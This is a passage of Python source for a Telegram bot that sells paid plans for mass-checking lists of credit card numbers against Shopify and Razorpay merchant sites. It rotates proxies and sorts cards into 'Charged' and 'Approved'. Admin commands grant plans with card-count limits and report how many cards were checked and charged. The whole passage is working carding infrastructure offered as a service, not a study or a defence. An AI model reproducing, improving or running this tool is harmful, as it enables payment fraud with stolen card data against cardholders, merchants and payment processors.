        return await styled_reply(event, f"{PE} <b>{bs('Reply to .txt or paste cards after')} </b><code>/msp</code>", emoji_ids=[CE["info"]])
    sites = await get_user_shopify_sites(uid)
    if not sites: return await styled_reply(event, f"{PE} <b>{bs('No Shopify sites!')} </b><code>/addsite</code>", emoji_ids=[CE["warn"]])
    cards = extract_cc(content)
    if not cards: return await styled_reply(event, f"{PE} <b>{bs('No valid cards')}</b>", emoji_ids=[CE["cross"]])
    if len(cards) > cl: cards = cards[:cl]
    await styled_reply(event, f"<pre>{PE} {len(cards)} {bs('CCs')} | {bs('Limit')}: {cl}</pre>", emoji_ids=[CE["star"]])
    proxies = await get_all_user_proxies(uid)
    rotator = SmartRotator()
    async def shopify_mass_check(card, http_session):
        result, _ = await check_shopify_with_retry(card, sites, uid, proxies, 3, rotator, cancel_check=lambda: ACTIVE_MTXT_PROCESSES.get(uid, {}).get("stopped", True), http_session=http_session)
        return result
    if from_inline:
        ACTIVE_MTXT_PROCESSES[uid] = {"stopped": False, "tasks": []}
        asyncio.create_task(_run_mass_process(event, cards, proxies, True, ACTIVE_MTXT_PROCESSES, "stop_chk", shopify_mass_check, "Shopify", "msp"))
    else:
        kb = [[pbtn(bs("Charged + Approved"), f"chk_pref:yes:{uid}")], [pbtn(bs("Only Charged"), f"chk_pref:no:{uid}")]]
        pm = await styled_reply(event, f"{PE} <b>{bs('Filter')}</b>", kb, emoji_ids=[CE["chart"]])
        USER_APPROVED_PREF[f"chk_{uid}"] = {"cards": cards, "sites": sites, "proxies": proxies, "event": event, "pref_msg": pm, "rotator": rotator}

@client.on(events.CallbackQuery(pattern=rb"chk_pref:(yes|no):(\d+)"))
async def chk_pref_cb(event):
    pref = event.pattern_match.group(1).decode()
    uid = int(event.pattern_match.group(2).decode())
    if event.sender_id != uid: return await event.answer(f"{bs('Not yours')}!", alert=True)
    data = USER_APPROVED_PREF.pop(f"chk_{uid}", None)
    if not data: return await event.answer(f"{bs('Expired')}!", alert=True)
    try: await data["pref_msg"].delete()
    except: pass
    if uid in ACTIVE_MTXT_PROCESSES: return await event.answer(f"{bs('Already running')}!", alert=True)
    ACTIVE_MTXT_PROCESSES[uid] = {"stopped": False, "tasks": []}
    await event.answer(f"{bs('Starting')}...")
    rotator = data.get("rotator", SmartRotator())
    sites, proxies = data["sites"], data["proxies"]
    async def shopify_mass_check(card, http_session):
        result, _ = await check_shopify_with_retry(card, sites, uid, proxies, 3, rotator, cancel_check=lambda: ACTIVE_MTXT_PROCESSES.get(uid, {}).get("stopped", True), http_session=http_session)
        return result
    asyncio.create_task(_run_mass_process(data["event"], data["cards"], proxies, pref == "yes", ACTIVE_MTXT_PROCESSES, "stop_chk", shopify_mass_check, "Shopify", "msp"))

@client.on(events.CallbackQuery(pattern=rb"stop_chk:(\d+)"))
async def stop_chk_cb(event):
    puid = int(event.pattern_match.group(1).decode())
    if event.sender_id != puid and event.sender_id not in ADMIN_ID: return await event.answer(f"{bs('Not yours')}!", alert=True)
    proc = ACTIVE_MTXT_PROCESSES.get(puid)
    if not proc: return await event.answer(f"{bs('None active')}!", alert=True)
    if isinstance(proc, dict):
        proc["stopped"] = True
        for t in proc.get("tasks", []):
            if not t.done(): t.cancel()
    await event.answer(f"{bs('Stopping')}...", alert=True)

# ---------- /mrz (Razorpay Mass) ----------
@client.on(events.NewMessage(pattern=r'(?i)^[/.]mrz\b'))
async def mass_check_razorpay(event):
    if await check_maintenance(event): return
    if not await force_join_check(event): return
    _, at, plan = await get_user_access(event)
    if at == "banned": t, e = banned_user_message(); return await styled_reply(event, t, emoji_ids=e)
    uid = event.sender_id
    if uid not in ADMIN_ID and not is_paid_plan(plan):
        return await send_premium_only_message(event)
    cl = get_cc_limit(plan, uid)
    if uid in ACTIVE_MRZ_PROCESSES:
        return await styled_reply(event, f"{PE} <b>{bs('Already running')}</b>", emoji_ids=[CE["warn"]])
    content, from_inline = "", False
    cmd_text = re.sub(r'^[/.]mrz\s*', '', event.raw_text, flags=re.IGNORECASE).strip()
    if cmd_text:
        content = cmd_text
        from_inline = True
    elif event.reply_to_msg_id:
        rm = await event.get_reply_message()
        if not rm:
            return await styled_reply(event, f"{PE} <b>{bs('Message not found')}</b>", emoji_ids=[CE["warn"]])
        if rm.document:
            downloaded = await rm.download_media(bytes)
            if downloaded:
                content = downloaded.decode('utf-8', errors='ignore')
            else:
                content = ""
        elif rm.text:
            content = rm.text
    else:
        return await styled_reply(event, f"{PE} <b>{bs('Reply to .txt or paste cards after')} </b><code>/mrz</code>", emoji_ids=[CE["info"]])
    cards = extract_cc(content)
    if not cards:
        return await styled_reply(event, f"{PE} <b>{bs('No valid cards')}</b>", emoji_ids=[CE["cross"]])
    if len(cards) > cl:
        cards = cards[:cl]
    await styled_reply(event, f"<pre>{PE} {len(cards)} {bs('CCs')} | {bs('RazorPay')} | {bs('Limit')}: {cl}</pre>", emoji_ids=[CE["star"]])
    proxies = await get_all_user_proxies(uid)
    sites = await get_user_razorpay_sites(uid)
    if not sites:
        sites = [None]
    rotator = SmartRotator()
    async def razorpay_mass_check(card, http_session):
        return await check_razorpay_with_retry(card, sites, uid, proxies, 3, rotator, cancel_check=lambda: ACTIVE_MRZ_PROCESSES.get(uid, {}).get("stopped", True), http_session=http_session)
    if from_inline:
        ACTIVE_MRZ_PROCESSES[uid] = {"stopped": False, "tasks": []}
        asyncio.create_task(_run_mass_process(event, cards, proxies, True, ACTIVE_MRZ_PROCESSES, "stop_mrz", razorpay_mass_check, "RazorPay", "mrz"))
    else:
        kb = [[pbtn(bs("Charged + Approved"), f"mrz_pref:yes:{uid}")], [pbtn(bs("Only Charged"), f"mrz_pref:no:{uid}")]]
        pm = await styled_reply(event, f"{PE} <b>{bs('Filter')}</b>", kb, emoji_ids=[CE["chart"]])
        USER_APPROVED_PREF[f"mrz_{uid}"] = {"cards": cards, "sites": sites, "proxies": proxies, "event": event, "pref_msg": pm, "rotator": rotator}

@client.on(events.CallbackQuery(pattern=rb"mrz_pref:(yes|no):(\d+)"))
async def mrz_pref_cb(event):
    pref = event.pattern_match.group(1).decode()
    uid = int(event.pattern_match.group(2).decode())
    if event.sender_id != uid: return await event.answer(f"{bs('Not yours')}!", alert=True)
    data = USER_APPROVED_PREF.pop(f"mrz_{uid}", None)
    if not data: return await event.answer(f"{bs('Expired')}!", alert=True)
    try: await data["pref_msg"].delete()
    except: pass
    if uid in ACTIVE_MRZ_PROCESSES: return await event.answer(f"{bs('Already running')}!", alert=True)
    ACTIVE_MRZ_PROCESSES[uid] = {"stopped": False, "tasks": []}
    await event.answer(f"{bs('Starting')}...")
    rotator = data.get("rotator", SmartRotator())
    sites, proxies = data["sites"], data["proxies"]
    async def razorpay_mass_check(card, http_session):
        return await check_razorpay_with_retry(card, sites, uid, proxies, 3, rotator, cancel_check=lambda: ACTIVE_MRZ_PROCESSES.get(uid, {}).get("stopped", True), http_session=http_session)
    asyncio.create_task(_run_mass_process(data["event"], data["cards"], proxies, pref == "yes", ACTIVE_MRZ_PROCESSES, "stop_mrz", razorpay_mass_check, "RazorPay", "mrz"))

@client.on(events.CallbackQuery(pattern=rb"stop_mrz:(\d+)"))
async def stop_mrz_cb(event):
    puid = int(event.pattern_match.group(1).decode())
    if event.sender_id != puid and event.sender_id not in ADMIN_ID: return await event.answer(f"{bs('Not yours')}!", alert=True)
    proc = ACTIVE_MRZ_PROCESSES.get(puid)
    if not proc: return await event.answer(f"{bs('None active')}!", alert=True)
    if isinstance(proc, dict):
        proc["stopped"] = True
        for t in proc.get("tasks", []):
            if not t.done(): t.cancel()
    await event.answer(f"{bs('Stopping')}...", alert=True)

# ---------- /stop ----------
@client.on(events.NewMessage(pattern=r'(?i)^[/.]stop$'))
async def stop_cmd(event):
    uid = event.sender_id
    stopped_any = False
    for store in [ACTIVE_MTXT_PROCESSES, ACTIVE_MRZ_PROCESSES]:
        proc = store.get(uid)
        if proc and isinstance(proc, dict):
            proc["stopped"] = True
            for task in proc.get("tasks", []):
                if not task.done(): task.cancel()
            stopped_any = True
    if not stopped_any: return await styled_reply(event, f"{PE} <b>{bs('No active session')}</b>", emoji_ids=[CE["warn"]])
    await styled_reply(event, f"{PE} <b>{bs('Stopping')}...</b>", emoji_ids=[CE["stop"]])

# ---------- /status (admin) ----------
@client.on(events.NewMessage(pattern=r'(?i)^[/.]status$'))
async def status_cmd(event):
    if event.sender_id not in ADMIN_ID: return
    try:
        st = await _build_status_text()
        await styled_reply(event, st, buttons=[[pbtn("🔄 Refresh", data="refresh_status")]])
    except Exception as e: await styled_reply(event, f"⚠️ <code>{e}</code>")

@client.on(events.CallbackQuery(data=b"refresh_status"))
async def refresh_status_cb(event):
    if event.sender_id not in ADMIN_ID: return await event.answer("No!", alert=True)
    await event.answer("Refreshing...")
    try:
        st = await _build_status_text()
        msg = event.message if hasattr(event, 'message') else await event.get_message()
        await styled_edit(msg, st, buttons=[[pbtn("🔄 Refresh", data="refresh_status")]])
    except: pass

# ---------- Admin commands ----------
@client.on(events.NewMessage(pattern=r'(?i)^[/.](maintenance|maintance)\s+(on|off)$'))
async def maint_toggle(event):
    if event.sender_id not in ADMIN_ID: return
    a = event.raw_text.lower().split()[1]
    await set_maintenance_mode(a == "on")
    await styled_reply(event, f"{PE} <b>{bs('Maintenance')} {bs('On') if a == 'on' else bs('Off')}</b>", emoji_ids=[CE["stop"] if a == "on" else CE["check"]])

async def _handle_plan_assign(event, plan_key):
    if event.sender_id not in ADMIN_ID: return
    parts = event.raw_text.split()
    if len(parts) < 2: return await styled_reply(event, f"{PE} <code>/{plan_key} user_id</code>", emoji_ids=[CE["warn"]])
    try: target_uid = int(parts[1])
    except: return await styled_reply(event, f"{PE} <b>{bs('Invalid ID')}</b>", emoji_ids=[CE["cross"]])
    pi = PLANS[plan_key]
    try: target_entity = await client.get_entity(target_uid); target_name = getattr(target_entity, 'first_name', None) or "Unknown"
    except: target_name = "Unknown"
    await ensure_user(target_uid)
    current_plan = await get_user_plan(target_uid); is_upgrade = is_paid_plan(current_plan)
    await set_user_plan(target_uid, pi["tier"], pi["duration_days"])
    expiry_date = (datetime.now() + timedelta(days=pi["duration_days"])).strftime('%Y-%m-%d %H:%M:%S')
    await styled_reply(event, f"""<b>✅ {bs('Plan Updated')}</b>\n<a href='https://t.me/dixit_nath'>⊀</a> <b>{bs('User')}</b> ↬ <a href='tg://user?id={target_uid}'>{target_name}</a>\n<a href='https://t.me/dixit_nath'>⊀</a> <b>{bs('Plan')}</b> ↬ {pi['emoji']} <b>{pi['name']}</b>\n<a href='https://t.me/dixit_nath'>⊀</a> <b>{bs('Duration')}</b> ↬ <code>{pi['duration_days']} {bs('days')}</code>\n<a href='https://t.me/dixit_nath'>⊀</a> <b>{bs('Expires')}</b> ↬ <code>{expiry_date}</code>""")
    try:
        await styled_send(target_uid, f"""<b>🎉 {bs('Plan Upgraded!')} 🎉</b>\n{pi['emoji']} <b>{pi['name']}</b> ━ <code>{pi['duration_days']}d</code>\n{bs('Limit')}: {get_cc_limit(pi['tier'])} CCs\n{bs('Expires')}: {expiry_date}""")
    except: pass
    try:
        receipt_id = f"CARDX-{''.join(random.choices(string.ascii_uppercase + string.digits, k=8))}"
        lt = f"{bs('Plan RENEWED')} 🔄" if is_upgrade else f"{bs('New Plan')} 🛒"
        await styled_send(LOG_CHANNEL_ID, f"<b>{lt}</b>\n<a href='tg://user?id={target_uid}'>{target_name}</a> ━ {pi['emoji']}{pi['name']} ━ {pi['price']} ━ {receipt_id}")
    except: pass

@client.on(events.NewMessage(pattern=r'(?i)^[/.]plan1\b'))
async def plan1_cmd(event): await _handle_plan_assign(event, "plan1")
@client.on(events.NewMessage(pattern=r'(?i)^[/.]plan2\b'))
async def plan2_cmd(event): await _handle_plan_assign(event, "plan2")
@client.on(events.NewMessage(pattern=r'(?i)^[/.]plan3\b'))
async def plan3_cmd(event): await _handle_plan_assign(event, "plan3")
@client.on(events.NewMessage(pattern=r'(?i)^[/.]plan4\b'))
async def plan4_cmd(event): await _handle_plan_assign(event, "plan4")
@client.on(events.NewMessage(pattern=r'(?i)^[/.]rplan\b'))
async def rplan_cmd(event):
    if event.sender_id not in ADMIN_ID: return
    parts = event.raw_text.split()
    if len(parts) < 2: return await styled_reply(event, f"{PE} <code>/rplan user_id</code>", emoji_ids=[CE["warn"]])
    try: target_uid = int(parts[1])
    except: return await styled_reply(event, f"{PE} <b>{bs('Invalid')}</b>", emoji_ids=[CE["cross"]])
    await ensure_user(target_uid)
    cp = await get_user_plan(target_uid)
    if not is_paid_plan(cp): return await styled_reply(event, f"{PE} <b>{bs('No active plan')}</b>", emoji_ids=[CE["cross"]])
    try: ent = await client.get_entity(target_uid); tn = getattr(ent, 'first_name', None) or "?"
    except: tn = "?"
    await set_user_plan(target_uid, "Bronze", 0)
    await styled_reply(event, f"{PE} <b>{bs('Revoked')} {cp} from {tn}</b>", emoji_ids=[CE["check"]])
    try: await styled_send(target_uid, f"{PE} <b>{bs('Your plan has been ended. Contact admin to renew.')}</b>", emoji_ids=[CE["warn"]])
    except: pass

@client.on(events.NewMessage(pattern=r'(?i)^[/.]stats$'))
async def stats_cmd(event):
    if event.sender_id not in ADMIN_ID: return
    try:
        tu = await get_total_users(); pu = await get_premium_count()
        ts_shopify = await get_total_shopify_sites_count()
        ts_razorpay = await get_total_razorpay_sites_count()
        tc = await get_total_cards_count()
        ch = await get_charged_count(); ap = await get_approved_count()
        await styled_reply(event, f"""{PE} <b>{bs('Stats')}</b> {PE}
<b>━━━━━━━━━━━━━━━━━</b>
{PE} <b>{bs('Users')}:</b> <code>{tu}</code> | <b>{bs('Premium')}:</b> <code>{pu}</code>
{PE} <b>{bs('Shopify Sites')}:</b> <code>{ts_shopify}</code>
{PE} <b>{bs('Razorpay Sites')}:</b> <code>{ts_razorpay}</code>
{PE} <b>{bs('Cards Checked')}:</b> <code>{tc}</code>
{PE} <b>{bs('Charged')}:</b> <code>{ch}</code> | <b>{bs('Approved')}:</b> <code>{ap}</code>
<b>━━━━━━━━━━━━━━━━━</b>
{PE} <b>{bs('MSP Active')}:</b> <code>{len(ACTIVE_MTXT_PROCESSES)}</code> ({MSP_PER_USER_WORKERS}w)
{PE} <b>{bs('MRZ Active')}:</b> <code>{len(ACTIVE_MRZ_PROCESSES)}</code> ({MRZ_PER_USER_WORKERS}w)""", emoji_ids=[CE["fire"], CE["fire"], CE["chart"], CE["link"], CE["gem"], CE["brain"], CE["shield"]])
    except Exception as e:
        await styled_reply(event, f"{PE} <b>{bs('Error')}:</b> <code>{e}</code>", emoji_ids=[CE["cross"]])

# ---------- Proxy commands ----------
@client.on(events.NewMessage(pattern=r'(?i)^[/.]addpxy'))
async def add_proxy_cmd(event):
    if await check_maintenance(event): return
    if not await force_join_check(event): return
    if event.is_group: return await styled_reply(event, f"{PE} <b>{bs('Private only')}</b>", emoji_ids=[CE["stop"]])
    if await is_banned_user(event.sender_id): t, e = banned_user_message(); return await styled_reply(event, t, emoji_ids=e)
    plan = await get_user_plan(event.sender_id)
    if event.sender_id not in ADMIN_ID and not is_paid_plan(plan): return await send_premium_only_message(event)
    try:
        lines = []
        if event.is_reply:
            reply = await event.get_reply_message()
            if reply and reply.file:
                downloaded = await reply.download_media(bytes)
                if downloaded:
                    lines = [l.strip() for l in downloaded.decode('utf-8', errors='ignore').splitlines() if l.strip()]
            elif reply and reply.text:
                lines = [l.strip() for l in reply.text.splitlines() if l.strip()]
        else:
            p = event.raw_text.split(maxsplit=1)
            if len(p) == 2:
                lines = [l.strip() for l in p[1].splitlines() if l.strip()]
            else:
                return await styled_reply(event, f"{PE} <code>/addpxy ip:port:user:pass</code>", emoji_ids=[CE["info"]])
        if not lines: return await styled_reply(event, f"{PE} <b>{bs('No proxies')}</b>", emoji_ids=[CE["cross"]])
        await ensure_user(event.sender_id)
        cc = await get_proxy_count(event.sender_id)
        if cc >= 100: return await styled_reply(event, f"{PE} <b>{bs('Limit 100/100')}</b>", emoji_ids=[CE["cross"]])
        existing = {p['proxy_url'] for p in await get_all_user_proxies(event.sender_id)}
        parsed = []
        for l in lines:
            pd = parse_proxy_format(l)
            if pd and pd['proxy_url'] not in existing:
                parsed.append(pd)
                existing.add(pd['proxy_url'])
        if not parsed: return await styled_reply(event, f"{PE} <b>{bs('No valid proxies')}</b>", emoji_ids=[CE["cross"]])
        parsed = parsed[:100-cc]
        tm = await styled_reply(event, f"{PE} <b>{bs('Testing')} {len(parsed)}...</b>", emoji_ids=[CE["shield"]])
        added = 0
        failed = 0
        for i in range(0, len(parsed), 10):
            batch = parsed[i:i+10]
            results = await asyncio.gather(*[test_proxy(p['proxy_url']) for p in batch], return_exceptions=True)
            for pd2, res in zip(batch, results):
                if isinstance(res, tuple) and res[0]:
                    await add_proxy_db(event.sender_id, pd2)
                    added += 1
                else:
                    failed += 1
        await styled_edit(tm, f"{PE} <b>{bs('Done')}</b> ✅{added} ❌{failed} | {bs('Total')}: {cc+added}/100", emoji_ids=[CE["fire"]])
    except Exception as e:
        await styled_reply(event, f"{PE} <b>{bs('Error')}:</b> <code>{e}</code>", emoji_ids=[CE["cross"]])

@client.on(events.NewMessage(pattern=r'(?i)^[/.]proxy$'))
async def view_proxies(event):
    if await check_maintenance(event): return
    if not await force_join_check(event): return
    if event.is_group: return await styled_reply(event, f"{PE} <b>{bs('Private only')}</b>", emoji_ids=[CE["stop"]])
    if await is_banned_user(event.sender_id): t, e = banned_user_message(); return await styled_reply(event, t, emoji_ids=e)
    plan = await get_user_plan(event.sender_id)
    if event.sender_id not in ADMIN_ID and not is_paid_plan(plan): return await send_premium_only_message(event)
    proxies = await get_all_user_proxies(event.sender_id)
    if not proxies: return await styled_reply(event, f"{PE} <b>{bs('No proxies')}</b> <code>/addpxy</code>", emoji_ids=[CE["cross"]])
    text = f"{PE} <b>{bs('Proxies')}</b> ({len(proxies)}/100) {PE}\n<b>━━━━━━━━━━━━━━━━━</b>\n"
    eid = [CE["fire"], CE["fire"]]
    for i, p in enumerate(proxies[:30], 1): text += f"<code>{i}.</code> {PE} <b>{p['ip']}:{p['port']}</b>\n"; eid.append(CE["link"])
    if len(proxies) > 30: text += f"\n<i>+{len(proxies)-30} more</i>"
    text += f"\n{PE} <code>/rmpxy index</code>"; eid.append(CE["trash"])
    await styled_reply(event, text, emoji_ids=eid)

@client.on(events.NewMessage(pattern=r'(?i)^[/.]rmpxy'))
async def remove_proxy_cmd(event):
    if await check_maintenance(event): return
    if not await force_join_check(event): return
    if event.is_group: return await styled_reply(event, f"{PE} <b>{bs('Private only')}</b>", emoji_ids=[CE["stop"]])
    if await is_banned_user(event.sender_id): t, e = banned_user_message(); return await styled_reply(event, t, emoji_ids=e)
    plan = await get_user_plan(event.sender_id)
    if event.sender_id not in ADMIN_ID and not is_paid_plan(plan): return await send_premium_only_message(event)
    proxies = await get_all_user_proxies(event.sender_id)
    if not proxies: return await styled_reply(event, f"{PE} <b>{bs('No proxies')}</b>", emoji_ids=[CE["cross"]])
    p = event.raw_text.split(maxsplit=1)
    if len(p) == 1: return await styled_reply(event, f"{PE} <code>/rmpxy index</code> or <code>all</code>", emoji_ids=[CE["warn"]])
    arg = p[1].strip().lower()
    if arg == 'all':
        c = await clear_all_proxies(event.sender_id)
        return await styled_reply(event, f"{PE} <b>{bs('Cleared')} {c}</b>", emoji_ids=[CE["check"]])
    try:
        idx = int(arg) - 1
        if 0 <= idx < len(proxies):
            rm = await remove_proxy_by_index(event.sender_id, idx)
            await styled_reply(event, f"{PE} <b>{bs('Removed')} {rm['ip']}:{rm['port']}</b>", emoji_ids=[CE["check"]])
        else: await styled_reply(event, f"{PE} <b>{bs('Invalid')}</b>", emoji_ids=[CE["cross"]])
    except: await styled_reply(event, f"{PE} <b>{bs('Invalid')}</b>", emoji_ids=[CE["cross"]])

@client.on(events.NewMessage(pattern=r'(?i)^[/.]chkpxy$'))
async def check_proxies_cmd(event):
    if await check_maintenance(event): return
    if not await force_join_check(event): return
    if event.is_group: return await styled_reply(event, f"{PE} <b>{bs('Private only')}</b>", emoji_ids=[CE["stop"]])
    if await is_banned_user(event.sender_id): t, e = banned_user_message(); return await styled_reply(event, t, emoji_ids=e)
    plan = await get_user_plan(event.sender_id)
    if event.sender_id not in ADMIN_ID and not is_paid_plan(plan): return await send_premium_only_message(event)
    proxies = await get_all_user_proxies(event.sender_id)
    if not proxies: return await styled_reply(event, f"{PE} <b>{bs('No proxies')}</b>", emoji_ids=[CE["cross"]])
    sm = await styled_reply(event, f"{PE} <b>{bs('Testing')} {len(proxies)}...</b>", emoji_ids=[CE["shield"]])
    results = await asyncio.gather(*[test_proxy(p['proxy_url']) for p in proxies], return_exceptions=True)
    w = sum(1 for r in results if isinstance(r, tuple) and r[0])
    await styled_edit(sm, f"{PE} <b>{bs('Proxy Check')}</b>\n✅ {bs('Working')}: {w}\n❌ {bs('Dead')}: {len(results)-w}", emoji_ids=[CE["shield"]])

# ====================== MAIN ======================
async def main():
    global client_instance
    client_instance = client
    log_system("BOOT", "Initializing database...")
    await init_db()
    while True:
        try:
            log_system("BOOT", "Starting bot...")
            await client.start(bot_token=BOT_TOKEN)
            log_system("BOOT", "✅ Bot Started!")
            await client.run_until_disconnected()
        except FloodWaitError as e:
            log_system("FLOOD", f"Sleeping {e.seconds+5}s", "warning")
            await asyncio.sleep(e.seconds + 5)
        except Exception as e:
            log_system("CRASH", f"{e}", "error")
            await asyncio.sleep(10)

if __name__ == "__main__":
    asyncio.run(main())
